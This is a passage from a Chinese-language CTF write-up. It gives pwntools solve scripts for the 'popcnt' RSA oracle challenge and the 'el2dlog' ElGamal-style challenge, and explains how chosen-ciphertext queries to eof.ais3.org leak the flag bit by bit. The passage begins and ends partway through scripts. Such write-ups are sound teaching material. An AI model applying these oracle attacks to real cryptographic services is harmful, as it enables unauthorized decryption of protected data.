</span></span><span style=display:flex><span>    <span style=color:#75715e># r = process([&#39;python&#39;, &#39;./popcnt.py&#39;])</span>
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;eof.ais3.org&#39;</span>, <span style=color:#ae81ff>10051</span>)
</span></span><span style=display:flex><span>    ks <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    mp <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>        n   <span style=color:#f92672>=</span> bytes_to_long(b64decode(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()))
</span></span><span style=display:flex><span>        e   <span style=color:#f92672>=</span> bytes_to_long(b64decode(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()))
</span></span><span style=display:flex><span>        enc <span style=color:#f92672>=</span> bytes_to_long(b64decode(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()))
</span></span><span style=display:flex><span>        mp[n] <span style=color:#f92672>=</span> i
</span></span><span style=display:flex><span>        ks<span style=color:#f92672>.</span>append(((n, e), enc))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>assert</span> e <span style=color:#f92672>==</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(n[i], enc[i])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>init()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>raw_ask</span>(i, num):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;To: &#39;</span>, bytes(str(i) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Message: &#39;</span>, b64encode(long_to_bytes(num)) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask</span>(n, i):
</span></span><span style=display:flex><span>    j <span style=color:#f92672>=</span> mp[n]
</span></span><span style=display:flex><span>    (n, e), enc <span style=color:#f92672>=</span> ks[j]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> raw_ask(j, enc <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, i <span style=color:#f92672>*</span> <span style=color:#ae81ff>65537</span>, n) <span style=color:#f92672>%</span> n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reduce</span>(n, L, R, i):
</span></span><span style=display:flex><span>    B <span style=color:#f92672>=</span> Fraction(n, (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> abs(L <span style=color:#f92672>//</span> B <span style=color:#f92672>-</span> R <span style=color:#f92672>//</span> B) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> abs(L <span style=color:#f92672>//</span> B <span style=color:#f92672>-</span> R <span style=color:#f92672>//</span> B) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> L, R
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    M <span style=color:#f92672>=</span> (L <span style=color:#f92672>//</span> B) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(f&#39;{M = }&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(f&#39;{int(B) = }&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(f&#39;{int(L) = }&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(f&#39;{int(R) = }&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (M <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>^</span> (ask(n, i) <span style=color:#f92672>==</span> ask(n, i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> L, M <span style=color:#f92672>*</span> B
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> M <span style=color:#f92672>*</span> B, R
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>R <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>512</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>prog <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> R <span style=color:#f92672>-</span> L <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>    prog<span style=color:#f92672>.</span>append((L, R))
</span></span><span style=display:flex><span>    tlrs <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> tqdm(range(<span style=color:#ae81ff>10</span>)):
</span></span><span style=display:flex><span>        n, e <span style=color:#f92672>=</span> ks[j][<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> max(<span style=color:#ae81ff>0</span>, int(n <span style=color:#f92672>/</span> (R <span style=color:#f92672>-</span> L))<span style=color:#f92672>.</span>bit_length() <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        tL, tR <span style=color:#f92672>=</span> L, R
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>            tL, tR <span style=color:#f92672>=</span> reduce(n, tL, tR, i <span style=color:#f92672>+</span> x)
</span></span><span style=display:flex><span>        tlrs<span style=color:#f92672>.</span>append((tL, tR))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    tmp <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> tL, tR <span style=color:#f92672>in</span> tlrs:
</span></span><span style=display:flex><span>        tmp<span style=color:#f92672>.</span>append(tL)
</span></span><span style=display:flex><span>        tmp<span style=color:#f92672>.</span>append(tR)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    tmp <span style=color:#f92672>=</span> sorted(tmp)[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>]
</span></span><span style=display:flex><span>    nL, nR <span style=color:#f92672>=</span> tmp[<span style=color:#ae81ff>0</span>], tmp[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span><span style=color:#75715e>#    if not (nL &lt;= flag &lt;= nR):</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        print(&#39;failed&#39;)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        mL = min([t[0] for t in tlrs])</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        mR = max([t[1] for t in tlrs])</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        for tL, tR in tlrs:</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#            sL = float((tL - mL) / (mR - mL))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#            sR = float((tR - mL) / (mR - mL))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#            print(min(abs(flag-tL), abs(flag-tR)) &lt;= (tR-tL)/2, sL, sR)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        print(R - L)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        print(long_to_bytes(int((L+R)/2)))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        exit(-1)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;shrink&#39;</span>, float((nR <span style=color:#f92672>-</span> nL) <span style=color:#f92672>/</span> (R <span style=color:#f92672>-</span> L)))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (float((nR <span style=color:#f92672>-</span> nL) <span style=color:#f92672>/</span> (R <span style=color:#f92672>-</span> L))) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0.1</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;failed!&#39;</span>)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        init()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    L, R <span style=color:#f92672>=</span> nL, nR
</span></span><span style=display:flex><span>    M <span style=color:#f92672>=</span> (L<span style=color:#f92672>+</span>R) <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    print(long_to_bytes(int(M)))
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(float(L), float(flag), float(R))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(L, R)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=el2dlog>el2dlog</h3><p>這題的變數好多，整理起來大概可以這樣講：</p><blockquote><p>隨機生成 1024 bit 質數 $p_1, q_1$，乘起來得到 $N$。<br>隨機生成 2048 bit 質數 $p_2$<br>隨機生成 $g_1$，保證 $g_1$ 是 $N$ 的二次剩餘且 $\gcd(N, g_1) = 1$。<br>隨機生成 $g_2, d, k \in [2, p_2-2]$<br>告訴你 $N = p_1 q_1$<br>告訴你 $c_1 = g_2 ^ k \% p_2$<br>告訴你 $c_2 = g_2 ^ {dk} \cdot x \% p_2$。（$x$ 是我們要求的 flag）<br>我們每次可以丟出兩個數字 $e_1, e_2$ 可以得到 $g^m \% N$ 的結果，其中 $m = {(e_1 ^ {-d} \cdot e_2) \% {p_2}}$</p></blockquote><p>另外我們還會知道一個變數 <code>hint</code>，其值為 <code>p2 >> 1024</code>。</p><p>一開始覺得比較 trivial 的東西是可以直接問 <code>1,1</code> 得到 $g_1$，然後就可以二分搜得知 $p_2$ 精確是多少了，不過就不知道怎麼繼續做。<br>想了蠻久的，隊友表示這好像可以用跟前一題類似的作法解決。</p><p>注意到如果我們把 $c_1, c_2$ 丟回去詢問，那麼我們就可以得到 $g_1 ^ x$ 的結果了（$x$ 就是我們要求的 flag，不失一般性假設 $x &lt; p_2$），但這個數字量級解不了離散對數，可是我們可以把 $e_2$ 乘上一個數字 $z$ 就能讓 $m = zx \% p_2$。<br>因為 $p_2 \neq \varphi(N)$（照原本的 source code $p_2$ 似乎略大於 $\varphi(N)$ 但只要不等於應該都對），我們可以從 $(g_1 ^ {zx\%p_2}) ^ 2$ 與 $g_1 ^ {(2zx\%p_2)}$ 是否一樣得知 $zx\%p_2$ 是否 $\leq p_2 / 2$。</p><p>一樣問 2 的冪次就可以得到 flag 了<br>然後有趣的地方是我們其實不需要知道 $p_2$ 是多少，問了也只是白白浪費時間。<br>只需要把 p2 當成 <code>hint &lt;&lt; 1024</code> 就有足夠的精度了。<br>這題的 timeout 似乎是五分鐘，一開始我有問出 p2 並且使用 p2，不過超時了所以就壓了一點詢問次數到約 1000 次，但還是剛好超時一點點，後來我把網路從 csie 換成 csie-5G 就輕鬆過了 XD<br>直接從每秒 2~3 個 request 變成每秒十幾個 request。</p><p>最後的 script：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes, isPrime
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode, b64decode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> tqdm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> fractions <span style=color:#f92672>import</span> Fraction
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context.log_level = &#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process([&#39;python&#39;, &#39;./el2dlog.py&#39;])</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;eof.ais3.org&#39;</span>, <span style=color:#ae81ff>10052</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>c1 <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>c2 <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>hint <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>n <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>c1 <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>c2 <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># p2 = 0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask</span>(e1, e2):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c1 = &#39;</span>, bytes(str(e1) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c2 = &#39;</span>, bytes(str(e2) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> int(r<span style=color:#f92672>.</span>recvline())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>g1 <span style=color:#f92672>=</span> ask(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>g1 <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># #### get p2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># p2 = hint &lt;&lt; 1024</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># for i in tqdm(range(1024, -1, -1)):</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#     if ask(1, p2 + (1 &lt;&lt; i)) == pow(g1, p2 + (1 &lt;&lt; i), n):</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#         p2 += (1 &lt;&lt; i)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># p2 += 1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># assert isPrime(p2)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># # assert ((p2 &gt;&gt; 1024) == hint)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#### get flag</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lst <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>A <span style=color:#f92672>=</span> ask(c1, c2 <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>))
</span></span><span style=display:flex><span>B <span style=color:#f92672>=</span> ask(c1, c2 <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>250</span>))
</span></span><span style=display:flex><span>C <span style=color:#f92672>=</span> ask(c1, c2 <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1024</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> pow(A, pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>250</span>), n) <span style=color:#f92672>==</span> B
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> pow(A, pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1024</span>), n) <span style=color:#f92672>==</span> C
</span></span><span style=display:flex><span>
